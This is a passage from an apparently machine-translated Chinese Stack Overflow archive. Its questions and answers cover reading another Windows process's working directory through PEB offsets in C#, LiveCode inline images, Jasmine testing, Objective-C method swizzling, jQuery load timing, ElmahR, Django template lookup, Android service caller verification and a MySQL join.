                hr = NtWow64ReadVirtualMemory64(handle, us.Buffer, s, us.Length, IntPtr.Zero);
                if (hr != 0)
                    throw new Win32Exception(hr);

                return s;
            }
            else // we are running with the same bitness as the OS, 32 or 64
            {
                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
                int hr = NtQueryInformationProcess(handle, 0, ref pbi, Marshal.SizeOf(pbi), IntPtr.Zero);
                if (hr != 0)
                    throw new Win32Exception(hr);

                IntPtr pp = new IntPtr();
                if (!ReadProcessMemory(handle, pbi.PebBaseAddress + processParametersOffset, ref pp, new IntPtr(Marshal.SizeOf(pp)), IntPtr.Zero))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                UNICODE_STRING us = new UNICODE_STRING();
                if (!ReadProcessMemory(handle, pp + offset, ref us, new IntPtr(Marshal.SizeOf(us)), IntPtr.Zero))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                if ((us.Buffer == IntPtr.Zero) || (us.Length == 0))
                    return null;

                string s = new string('\0', us.Length / 2);
                if (!ReadProcessMemory(handle, us.Buffer, s, new IntPtr(us.Length), IntPtr.Zero))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                return s;
            }
        }
        finally
        {
            CloseHandle(handle);
        }
    }

    private const int PROCESS_QUERY_INFORMATION = 0x400;
    private const int PROCESS_VM_READ = 0x10;

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr Reserved1;
        public IntPtr PebBaseAddress;
        public IntPtr Reserved2_0;
        public IntPtr Reserved2_1;
        public IntPtr UniqueProcessId;
        public IntPtr Reserved3;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct UNICODE_STRING
    {
        public short Length;
        public short MaximumLength;
        public IntPtr Buffer;
    }

    // for 32-bit process in a 64-bit OS only
    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_BASIC_INFORMATION_WOW64
    {
        public long Reserved1;
        public long PebBaseAddress;
        public long Reserved2_0;
        public long Reserved2_1;
        public long UniqueProcessId;
        public long Reserved3;
    }

    // for 32-bit process in a 64-bit OS only
    [StructLayout(LayoutKind.Sequential)]
    private struct UNICODE_STRING_WOW64
    {
        public short Length;
        public short MaximumLength;
        public long Buffer;
    }

    [DllImport("ntdll.dll")]
    private static extern int NtQueryInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass, ref PROCESS_BASIC_INFORMATION ProcessInformation, int ProcessInformationLength, IntPtr ReturnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, ref IntPtr lpBuffer, IntPtr dwSize, IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, ref UNICODE_STRING lpBuffer, IntPtr dwSize, IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [MarshalAs(UnmanagedType.LPWStr)] string lpBuffer, IntPtr dwSize, IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr hObject);

    // for 32-bit process in a 64-bit OS only
    [DllImport("ntdll.dll")]
    private static extern int NtWow64QueryInformationProcess64(IntPtr ProcessHandle, int ProcessInformationClass, ref PROCESS_BASIC_INFORMATION_WOW64 ProcessInformation, int ProcessInformationLength, IntPtr ReturnLength);

    [DllImport("ntdll.dll")]
    private static extern int NtWow64ReadVirtualMemory64(IntPtr hProcess, long lpBaseAddress, ref long lpBuffer, long dwSize, IntPtr lpNumberOfBytesRead);

    [DllImport("ntdll.dll")]
    private static extern int NtWow64ReadVirtualMemory64(IntPtr hProcess, long lpBaseAddress, ref UNICODE_STRING_WOW64 lpBuffer, long dwSize, IntPtr lpNumberOfBytesRead);

    [DllImport("ntdll.dll")]
    private static extern int NtWow64ReadVirtualMemory64(IntPtr hProcess, long lpBaseAddress, [MarshalAs(UnmanagedType.LPWStr)] string lpBuffer, long dwSize, IntPtr lpNumberOfBytesRead);
} 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2014-05-24T07:53:11.247

“Simon Mourier”源在操作系统中工作正常，执行器，目标是 32 位。但其他人不是。所以我添加源来处理 32、64 位的所有组合。32、64位进程有5种可能的组合。首先，os、executor、target 都是 32 位的。其次，os是64bit，executor，target是32，64bit进程的组合。此代码在我的笔记本 Win7 64 位操作系统、32,64 位进程和目标 32,64 位进程、WinXp 32 位、执行程序、目标是 32 位中工作正常。但是，使用风险自负！

```
// ref: http://www.microsoft.com/whdc/system/Sysinternals/MoreThan64proc.mspx
public enum PROCESSINFOCLASS : int
{
    ProcessBasicInformation = 0, // 0, q: PROCESS_BASIC_INFORMATION, PROCESS_EXTENDED_BASIC_INFORMATION
    ProcessWow64Information = 26, // q: ULONG_PTR
}
[Flags]
public enum PEB_OFFSET
{
    CurrentDirectory,
    //DllPath,
    //ImagePathName,
    CommandLine,
    //WindowTitle,
    //DesktopInfo,
    //ShellInfo,
    //RuntimeData,
    //TypeMask = 0xffff,
    //Wow64 = 0x10000,
};

public class Is64BitChecker
{
    [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool IsWow64Process(
        [In] IntPtr hProcess,
        [Out] out bool wow64Process
    );

    public static bool GetProcessIsWow64(IntPtr hProcess)
    {
        if ((Environment.OSVersion.Version.Major == 5 && Environment.OSVersion.Version.Minor >= 1) ||
            Environment.OSVersion.Version.Major >= 6)
        {
            bool retVal;
            if (!IsWow64Process(hProcess, out retVal))
            {
                return false;
            }
            return retVal;
        }
        else
        {
            return false;
        }
    }

    public static bool InternalCheckIsWow64()
    {
        if ((Environment.OSVersion.Version.Major == 5 && Environment.OSVersion.Version.Minor >= 1) ||
            Environment.OSVersion.Version.Major >= 6)
        {
            using (Process p = Process.GetCurrentProcess())
            {
                bool retVal;
                if (!IsWow64Process(p.Handle, out retVal))
                {
                    return false;
                }
                return retVal;
            }
        }
        else
        {
            return false;
        }
    }
}

// All offset values below have been tested on Windows 7 & 8 only
// but you can use WinDbg "dt ntdll!_PEB" command and search for ProcessParameters offset to find the truth, depending on the OS version
public static class ProcessUtilities
{
    public static readonly bool Is64BitProcess = IntPtr.Size > 4;
    public static readonly bool Is64BitOperatingSystem = Is64BitProcess || Is64BitChecker.InternalCheckIsWow64();

    public static string GetCurrentDirectory(int processId)
    {
        return GetProcessParametersString(processId, PEB_OFFSET.CurrentDirectory);
    }

    public static string GetCurrentDirectory(this Process process)
    {
        if (process == null)
            throw new ArgumentNullException("process");

        return GetCurrentDirectory(process.Id);
    }

    #region GetCommandLine
    //public static string GetCommandLine(int processId)
    //{
    //    return null;// GetProcessParametersString(processId, Is64BitOperatingSystem ? 0x70 : 0x40);
    //}

    //public static string GetCommandLine(this Process process)
    //{
    //    if (process == null)
    //        throw new ArgumentNullException("process");

    //    return GetCommandLine(process.Id);
    //} 
    #endregion

    private static string GetProcessParametersString(int processId, PEB_OFFSET Offset)
    {
        IntPtr handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, processId);
        if (handle == IntPtr.Zero)
            throw new Win32Exception(Marshal.GetLastWin32Error());

        bool IsWow64Process = Is64BitChecker.InternalCheckIsWow64();
        bool IsTargetWow64Process = Is64BitChecker.GetProcessIsWow64(handle);
        bool IsTarget64BitProcess = Is64BitOperatingSystem && !IsTargetWow64Process;

        long offset = 0;
        long processParametersOffset = IsTarget64BitProcess ? 0x20 : 0x10;
        switch (Offset)
        {
            case PEB_OFFSET.CurrentDirectory:
                offset = IsTarget64BitProcess ? 0x38 : 0x24;
                break;
            case PEB_OFFSET.CommandLine:
            default:
                return null;
        }

        try
        {
            long pebAddress = 0;
            if (IsTargetWow64Process) // OS : 64Bit, Cur : 32 or 64, Tar: 32bit
            {
                IntPtr peb32 = new IntPtr();

                int hr = NtQueryInformationProcess(handle, (int)PROCESSINFOCLASS.ProcessWow64Information, ref peb32, IntPtr.Size, IntPtr.Zero);
                if (hr != 0) throw new Win32Exception(hr);
                pebAddress = peb32.ToInt64();

                IntPtr pp = new IntPtr();
                if (!ReadProcessMemory(handle, new IntPtr(pebAddress + processParametersOffset), ref pp, new IntPtr(Marshal.SizeOf(pp)), IntPtr.Zero))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                UNICODE_STRING_32 us = new UNICODE_STRING_32();
                if (!ReadProcessMemory(handle, new IntPtr(pp.ToInt64() + offset), ref us, new IntPtr(Marshal.SizeOf(us)), IntPtr.Zero))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                if ((us.Buffer == 0) || (us.Length == 0))
                    return null;

                string s = new string('\0', us.Length / 2);
                if (!ReadProcessMemory(handle, new IntPtr(us.Buffer), s, new IntPtr(us.Length), IntPtr.Zero))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                return s;
            }
            else if (IsWow64Process)//Os : 64Bit, Cur 32, Tar 64
            {
                PROCESS_BASIC_INFORMATION_WOW64 pbi = new PROCESS_BASIC_INFORMATION_WOW64();
                int hr = NtWow64QueryInformationProcess64(handle, (int)PROCESSINFOCLASS.ProcessBasicInformation, ref pbi, Marshal.SizeOf(pbi), IntPtr.Zero);
                if (hr != 0) throw new Win32Exception(hr);
                pebAddress = pbi.PebBaseAddress;

                long pp = 0;
                hr = NtWow64ReadVirtualMemory64(handle, pebAddress + processParametersOffset, ref pp, Marshal.SizeOf(pp), IntPtr.Zero);
                if (hr != 0)
                    throw new Win32Exception(hr);

                UNICODE_STRING_WOW64 us = new UNICODE_STRING_WOW64();
                hr = NtWow64ReadVirtualMemory64(handle, pp + offset, ref us, Marshal.SizeOf(us), IntPtr.Zero);
                if (hr != 0)
                    throw new Win32Exception(hr);

                if ((us.Buffer == 0) || (us.Length == 0))
                    return null;

                string s = new string('\0', us.Length / 2);
                hr = NtWow64ReadVirtualMemory64(handle, us.Buffer, s, us.Length, IntPtr.Zero);
                if (hr != 0)
                    throw new Win32Exception(hr);

                return s;
            }
            else// Os,Cur,Tar : 64 or 32
            {
                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
                int hr = NtQueryInformationProcess(handle, (int)PROCESSINFOCLASS.ProcessBasicInformation, ref pbi, Marshal.SizeOf(pbi), IntPtr.Zero);
                if (hr != 0) throw new Win32Exception(hr);
                pebAddress = pbi.PebBaseAddress.ToInt64();

                IntPtr pp = new IntPtr();
                if (!ReadProcessMemory(handle, new IntPtr(pebAddress + processParametersOffset), ref pp, new IntPtr(Marshal.SizeOf(pp)), IntPtr.Zero))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                UNICODE_STRING us = new UNICODE_STRING();
                if (!ReadProcessMemory(handle, new IntPtr((long)pp + offset), ref us, new IntPtr(Marshal.SizeOf(us)), IntPtr.Zero))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                if ((us.Buffer == IntPtr.Zero) || (us.Length == 0))
                    return null;

                string s = new string('\0', us.Length / 2);
                if (!ReadProcessMemory(handle, us.Buffer, s, new IntPtr(us.Length), IntPtr.Zero))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                return s;
            }
        }
        finally
        {
            CloseHandle(handle);
        }
    }

    private const int PROCESS_QUERY_INFORMATION = 0x400;
    private const int PROCESS_VM_READ = 0x10;

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr Reserved1;
        public IntPtr PebBaseAddress;
        public IntPtr Reserved2_0;
        public IntPtr Reserved2_1;
        public IntPtr UniqueProcessId;
        public IntPtr Reserved3;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct UNICODE_STRING
    {
        public short Length;
        public short MaximumLength;
        public IntPtr Buffer;
    }

    // for 32-bit process in a 64-bit OS only
    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_BASIC_INFORMATION_WOW64
    {
        public long Reserved1;
        public long PebBaseAddress;
        public long Reserved2_0;
        public long Reserved2_1;
        public long UniqueProcessId;
        public long Reserved3;
    }

    // for 32-bit process
    [StructLayout(LayoutKind.Sequential)]
    private struct UNICODE_STRING_WOW64
    {
        public short Length;
        public short MaximumLength;
        public long Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct UNICODE_STRING_32
    {
        public short Length;
        public short MaximumLength;
        public int Buffer;
    }

    [DllImport("ntdll.dll")]
    private static extern int NtQueryInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass, ref PROCESS_BASIC_INFORMATION ProcessInformation, int ProcessInformationLength, IntPtr ReturnLength);

    //ProcessWow64Information, // q: ULONG_PTR
    [DllImport("ntdll.dll")]
    private static extern int NtQueryInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass, ref IntPtr ProcessInformation, int ProcessInformationLength, IntPtr ReturnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, ref IntPtr lpBuffer, IntPtr dwSize, IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, ref UNICODE_STRING lpBuffer, IntPtr dwSize, IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, ref UNICODE_STRING_32 lpBuffer, IntPtr dwSize, IntPtr lpNumberOfBytesRead);

    //[DllImport("kernel32.dll", SetLastError = true)]
    //private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, ref UNICODE_STRING_WOW64 lpBuffer, IntPtr dwSize, IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [MarshalAs(UnmanagedType.LPWStr)] string lpBuffer, IntPtr dwSize, IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr hObject);

    // for 32-bit process in a 64-bit OS only
    [DllImport("ntdll.dll")]
    private static extern int NtWow64QueryInformationProcess64(IntPtr ProcessHandle, int ProcessInformationClass, ref PROCESS_BASIC_INFORMATION_WOW64 ProcessInformation, int ProcessInformationLength, IntPtr ReturnLength);

    [DllImport("ntdll.dll")]
    private static extern int NtWow64ReadVirtualMemory64(IntPtr hProcess, long lpBaseAddress, ref long lpBuffer, long dwSize, IntPtr lpNumberOfBytesRead);

    [DllImport("ntdll.dll")]
    private static extern int NtWow64ReadVirtualMemory64(IntPtr hProcess, long lpBaseAddress, ref UNICODE_STRING_WOW64 lpBuffer, long dwSize, IntPtr lpNumberOfBytesRead);

    [DllImport("ntdll.dll")]
    private static extern int NtWow64ReadVirtualMemory64(IntPtr hProcess, long lpBaseAddress, [MarshalAs(UnmanagedType.LPWStr)] string lpBuffer, long dwSize, IntPtr lpNumberOfBytesRead);
} 
```

# textbox - 是否可以显示内嵌图像？

> ID：16110939
> 
> 赞同：0
> 
> 时间：2013-04-19T18:08:05.537
> 
> 标签：textbox, livecode

文章[http://runrev.com/newsletter/june/issue135/newsletter4.php](http://runrev.com/newsletter/june/issue135/newsletter4.php)展示了如何在文本字段中显示表格。是否也可以显示内嵌图像？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T23:33:21.730

您必须弄乱该字段的 htmltext 才能插入在线图像，但可以这样做。将字段的htmltext放入一个变量中，然后插入一行html，如

```
put "<img src=" & quote & "http://www.site.com/image.png" & quote & ">" after line x of tHtmlText 
```

然后将字段的htmltext设置回tHtmlText

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T08:33:05.433

如果图像在您的堆栈中，您可以使用

```
put "%" into fld 1
set the imageSource of char 1 of fld 1 to 1014 
```

其中 % 是任意字符，1014 是任意图像的图像 ID。您可以设置字段中任何字符的 imageSource。

# javascript - jasmine(js) 测试具有完整 js 功能的简单 html/js 页面

> ID：16110944
> 
> 赞同：1
> 
> 时间：2013-04-19T18:08:26.650
> 
> 标签：javascript, jquery, jasmine

我有一个具有以下功能的 html/js(jquery) 应用程序：

单击按钮时，会打开一个模式并显示输入详细信息，我们可以输入并提交它们。提交的详细信息将存储在本地存储中，并自动使用新内容呈现页面。

我们创建的输入条目在页面上显示为一行。

而已 ！

我想为它写测试。那么，我需要为这个应用程序编写哪些测试？

1.  只需测试每个函数返回的内容。
2.  测试应用程序的功能。例如，添加一些示例条目，并根据需要检查它们是否在页面上显示。
3.  你建议的任何其他人。

顺便问一下，这种类型的应用程序可以使用 jasmine 吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-11-12T23:06:53.743

Jasmine 非常适合这类应用程序，您可能希望将其与 Karma JS 等测试运行程序结合使用。从某种意义上说，您需要编写： 1\. 小型且集中的单元测试，模拟尽可能多的未测试功能，例如服务器端调用。为此，我使用 Karma/Jasmine/Sinon。2\. 使用自动化框架（例如 Casper JS 驱动 PhantomJS）来模拟实际用户交互的功能/UI/集成测试。3\. 使用运行 Istanbul 的 Karma 代码覆盖率插件（包括在内）确保您有良好的代码覆盖率。

# objective-c - 调用 Category 的未覆盖方法

> ID：16110947
> 
> 赞同：1
> 
> 时间：2013-04-19T18:08:43.163
> 
> 标签：objective-c, overriding, objective-c-category

我正在尝试向 NSObject 的描述方法添加一个条件，其中任何响应可选协议（PrettyPrinter）中的方法的对象都将打印来自协议方法的结果，而不是普通的 NSObject 的描述。但是，如果作为打印机的对象没有响应协议，那么描述应该返回它正常的响应方式。

我目前这样做的尝试涉及在 NSObject 上编写一个类别，其中包含此协议和覆盖的描述方法。但是，我不知道有什么方法可以调用类别的未覆盖方法。

```
-(NSString*)description
{
    if ([self respondsToSelector:@selector(prettyPrinter)]) {
        return self.prettyPrinter;
    }else{
        // Would Like to return normal description if does not respond to selector. But
        // can not call super description due to being a category instead of a subclass
        return [super description];
    }
} 
```

任何关于我可以实现这一点的方法的想法都将不胜感激。谢谢！

更新：通过更多的搜索，这似乎可以通过一种叫做 swizzling 的东西来完成。然而，目前这方面的尝试尚未成功。任何关于使用 swizzling 来实现这一目标的技术建议也会有所帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-07-11T05:14:59.617

正如您所指出的，这可以通过方法调配来实现。运行时具有交换两种方法的实现的功能。

```
#import <objc/runtime.h>

@interface NSObject (PrettyPrinter)
- (NSString*) prettyPrinter;
@end

@implementation NSObject (PrettyPrinter)

// This is called when the category is being added
+ (void) load {
  Method method1 = class_getInstanceMethod(self, @selector(description));
  Method method2 = class_getInstanceMethod(self, @selector(swizzledDescription));

  // this is what switches the two methods
  method_exchangeImplementations(method1, method2);
}

// This is what will be executed in place of -description
- (NSString*) swizzledDescription {
  if( [self respondsToSelector:@selector(prettyPrinter)] ) {
    return [self prettyPrinter];
  }
  else {
    return [self swizzledDescription];
    // The above is not a recursive call, remember the implementation has
    //   been exchanged, this will really execute -description
  }
}

- (NSString*) prettyPrinter {
  return @"swizzled description";
}

@end 
```

该`-prettyPrinter`方法可以被删除，在这种情况下`NSLog`将返回由定义的值`-description`。

请注意，这只会 swizzle `-description`，尽管`NSLog`可能会调用其他方法，例如`NSArray`'s`–descriptionWithLocale:`

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-19T18:20:38.953

**如果一个类别覆盖了该类别的类中存在的方法，则无法调用原始实现。**

[点击这里阅读更多！](https://stackoverflow.com/questions/5272451/overriding-methods-using-categories-in-objective-c)

# javascript - 如何仅在文档完成加载后才加载 jQuery 函数

> ID：16110963
> 
> 赞同：9
> 
> 时间：2013-04-19T18:09:41.077
> 
> 标签：javascript, jquery, events

奇怪的情况：

我正在使用`jQuery`and构建一个菜单栏`CSS`。
在我的 JavaScript 文件中，我有一个`on-ready`这样的函数：

```
$(document).ready(function(e) {
    mark_active_menu();
} 
```

和...

```
function mark_active_menu() {
    var elementWidth = $("nav li").width();
    alert(elementWidth);
} 
```

出于某种原因，即使在**所有**文档完成加载之前，我也会收到宽度不正确的警报消息。只有当我发布消息时，文档的其余部分才会加载，并且我得到了应有的正确宽度。

为什么在所有文档完成加载之前调用我的函数？有没有办法仅在某个元素完成加载（例如：`nav`元素）之后才加载函数？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-04-19T18:11:15.093

您可以使用[window.load](https://developer.mozilla.org/en-US/docs/DOM/window.onload)，它将在所有资源完成加载后触发。

```
$(window).load(function(e) {
    mark_active_menu();
}); 
```

> load 事件在文档加载过程结束时触发。至此，文档中的所有对象都在DOM中，所有的图片和子帧都已经加载完毕，[参考](https://developer.mozilla.org/en-US/docs/DOM/window.onload)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-04-19T18:16:44.227

当前的所有解决方案都只是治疗主要问题的症状。如果您希望处理程序在所有 ajax 加载*后*执行，那么您可以使用 Promise。

```
var ajax1 = $.ajax();
var ajax2 = $.ajax();

jQuery(function($) {
    $.when.apply($, [ajax1, ajax2]).done(function() {
        // your code here
    });
}); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-19T18:11:39.483

尝试窗口加载事件：

```
$(window).load(function() {
    //Stuff here
}); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-04-19T18:11:39.333

可以肯定的是，尝试窗口`load`

```
$(window).load(function(e) {
    mark_active_menu();
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-06-21T06:59:53.390

之前（有时，在开始时不会绝对加载，几毫秒之后（大约 0-200 毫秒））：

```
$(document).ready(function(){
$('body').hide(0);
}); 
```

后：

```
$(window).load(function(){
$('body').delay(500).show(0);
}); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-07-07T09:10:52.440

在我使用 AJAX 和 HTML 的情况下。我对函数 $(document).ready() 和 $(window).load() 有同样的问题。我通过将我的事件处理程序（应该在 HTML DOC 中工作）添加到在 AJAX 请求完成后立即运行的 jQuery 函数中解决了这个问题。阅读：[“jQuery.post()”](https://api.jquery.com/jQuery.post/)（函数中的第三个参数）。

在我的代码中，它看起来像这样：

```
var RequestRootFolderContent = function(){
    $.post(
        'PHP/IncludeFiles/FolderContent.inc.php',
        function(data){
            $('[class~="folder-content"]').html(data);

            //Here what you need
            $('[class~="file"]').dblclick(function(){
                alert("Double click");
            });
        }
    )
} 
```

# winforms - 在 winform 应用程序中使用 elmahr.elmah

> ID：16110964
> 
> 赞同：0
> 
> 时间：2013-04-19T18:09:47.733
> 
> 标签：winforms, dashboard, elmahr

我最近向我的团队负责人展示了 ElmahR 仪表板，现在他想在我们当前的所有项目中使用 ElmahR 实现 ExceptionsLog，包括那些 Winform 应用程序，经过多天的搜索，我找不到添加Winform 应用程序作为“ElmahR 源”。

有人有线索吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T08:00:46.360

`ErrorPostModule`in`ElmahR.Elmah`不支持 Winforms 应用程序，因为它被编写为 ELMAH 模块，因此它与 ASP.NET 生命周期相关联，无法轻松适应。也就是说，`ErrorPostModule`它并没有做任何如此神奇的事情，并且可以很容易地作为编写用于 Winforms 应用程序的小型“处理程序”的指南。看看它的代码[here](https://bitbucket.org/wasp/elmahr/src/c1bd591d659dafd043c60e7c2e315282026f9178/src/ElmahR.Elmah/ErrorPostModule.cs?at=default)，你应该做的是：

*   替换 OnInit 方法中的内容，该方法仅读取配置位并附加错误处理程序
*   当发生错误时，像在`SetError`方法中那样处理它，将其发布到正确的目的地，读取您之前读取的配置参数。您将引用 ELMAH 并从您的异常中创建一个`Error`实例，然后使用`ErrorJson.EncodeString`它对其进行编码

您可能想借用[W3.cs](https://bitbucket.org/wasp/elmahr/src/c1bd591d659dafd043c60e7c2e315282026f9178/src/ElmahR.Elmah/W3.cs?at=default)文件来简化 http 表单的编译。

在某个时候，我可能会概括这项工作并将其放在 ElmahR.Elmah 中，但不确定何时能够完成。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-22T05:05:02.077

我刚刚派生了 elmahr 源代码来处理这个问题，我想从控制台应用程序中发布错误，所以我要删除对 Elmah 的依赖并创建“错误”对象并将它们发送到仪表板。

这是一项正在进行的工作，但可以用作解决问题的起点。

[https://bitbucket.org/rudygt/elmahr](https://bitbucket.org/rudygt/elmahr)

更新：分支现在包括完全支持使用 ServiceStack 端点发布到 ElmahR，使用 json over http。这消除了对原始 Elmah 的依赖以将错误发布到仪表板。第一个示例是 C# 控制台应用程序

# python - “admin”子目录触发（无意）Django Admin Pages

> ID：16110968
> 
> 赞同：3
> 
> 时间：2013-04-19T18:10:04.070
> 
> 标签：python, django, django-admin

我在某些自定义管理页面触发 Django 管理站点而不是显示我的自定义页面时遇到问题。

我的**urls.py**如下：

```
urlpatterns = patterns('',
    # ... trimmed ...

    # Admin pages
    url(r'^admin/doc/', include('django.contrib.admindocs.urls')),                       
    url(r'^admin/', include(admin.site.urls)),

    # Lobby Visitor Log
    url(r'^visitorLog', include('lobbyVisitorLog.urls')),
) 
```

在我的`lobbyVisitorLog`应用程序中，我有以下目录结构，导致“管理”页面

```
lobbyVisitorLog
  - templates
      - admin 
```

我的**lobbyVisitorLog/urls.py**如下：

```
urlpatterns = patterns('visitorLog.views',
    url(r'^/$', views.home, name='homeView'),
    url(r'^/search', views.search, name='searchView'),
    url(r'^/submit', views.submit, name='submitView'),

    url(r'^/admin/$', views.adminView, name='adminView'),
    url(r'^/admin/import/$', views.adminImportView, name='adminImportView'),

    url(r'^/(?P<guest_type>\w+)$', views.logEntry, name='logEntryView'),
) 
```

管理索引页面的**views.py**如下所示：

```
def adminView(request):
    return render(request, 'admin/index.html', {}, context_instance=RequestContext(request)) 
```

当我转到“mysite/visitorLog/admin/”时，我会看到带有以下消息的 Django 管理站点：“您无权编辑任何内容。”</p>

但是，如果我将“admin”目录更改为“utils”（或除“admin”之外的其他任何目录）并相应地更新我的目录`views.py`，一切都会按预期显示！这没关系，我可以处理我的目录被称为“utils”，但它会惹恼我......就够了。

发生了什么导致 Django 管理页面加载而不是我的自定义页面？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T19:41:23.343

默认情况下，django 首先检查您在`TEMPLATE_DIRS`“admin/index.html”中的每个路径。如果在那里找不到它，它会开始在模板目录中搜索`INSTALLED_APPS`设置中的每个应用程序。

如果`'django.contrib.admin'`在 中列出`INSTALLED_APPS`，它将使用 django.contrib.admin 应用程序中同名的 'admin/index.html' 模板。

移到`'django.contrib.admin'`最后一个位置`INSTALLED_APPS`应该允许它首先在您的 lobbyVisitorLog 应用程序中找到“admin/index.html”，但这会破坏管理站点，因为它会使用您的应用程序大堂访问日志中的“admin/index.html”。

解决此问题的一个好方法是在应用的模板目录中始终有一个以应用命名的子目录。例如：

```
lobbyVisitorLog
  - templates
    - lobbyVisitorLog
      - admin
        - index.html 
```

然后更新视图的模板路径：

```
def adminView(request):
    return render(request, 'lobbyVisitorLog/admin/index.html', {}, context_instance=RequestContext(request)) 
```

[您可以在此处](https://docs.djangoproject.com/en/1.4/ref/templates/api/#loader-types)找到有关 Django 如何加载模板的更多信息

# android - 具有不同签名的两个应用程序之间的自定义权限

> ID：16110969
> 
> 赞同：1
> 
> 时间：2013-04-19T18:10:22.497
> 
> 标签：android, android-permissions

我有两个使用不同证书/密钥签名的应用程序。

我想从应用程序 A 到应用程序 B 进行经过**身份验证**的调用（对服务）（因此没有第 3 方可以进行这样的调用）。

Android 中此类事情的常见解决方案是具有签名保护级别的自定义权限。但是，在我的情况下它不起作用，因为两个应用程序使用不同的证书（由不同的公司开发）签署

所以，问题是。如果我只想允许应用程序 A（或该公司开发的任何应用程序）在应用程序 B 中调用/绑定服务，那么这种情况下的最佳做法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T18:17:47.113

真的没有，恕我直言。

如果权限不是`signature`基于 - 的，则用户可以将其授予任何需要它的应用程序，因此权限对您没有帮助。

如果您使用具有绑定模式的服务，您的`Binder`has `getCallingUid()`，您可以使用它来查找调用应用程序的 UID。通过一些工作，您可以从`PackageManager`. 如何验证包名称取决于您（内置白名单，尝试从 中理解包的签名`PackageManager`，无论如何）。不过，这并不能防止有人弄乱您的 APK 并破解您的验证程序。

# mysql - MySQL：加入别名表

> ID：16110972
> 
> 赞同：0
> 
> 时间：2013-04-19T18:10:33.010
> 
> 标签：mysql

我正在尝试从我的主查询中加入 users_groups，但我似乎无法在别名表中加入它们。请帮我。它导致错误：“on 子句”中的未知列“node.id”

```
SELECT node.id, node.first_name, node.last_name, (COUNT( parent.id ) - ( sub_tree.depth +1 ) ) AS depth
FROM users AS node, users AS parent, users AS sub_parent, (
    SELECT node.id, node.first_name, node.last_name, (COUNT( parent.id ) -1) AS depth
    FROM users AS node, users AS parent
    WHERE node.lft BETWEEN parent.lft AND parent.rgt
        AND node.id =1
    GROUP BY node.id
    ORDER BY node.lft
) AS sub_tree
JOIN users_groups ON users_groups.user_id = node.id
WHERE node.lft BETWEEN parent.lft AND parent.rgt
    AND node.lft BETWEEN sub_parent.lft AND sub_parent.rgt
    AND sub_parent.id = sub_tree.id
GROUP BY node.id
ORDER BY node.lft
LIMIT 0 , 30 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T18:30:29.987

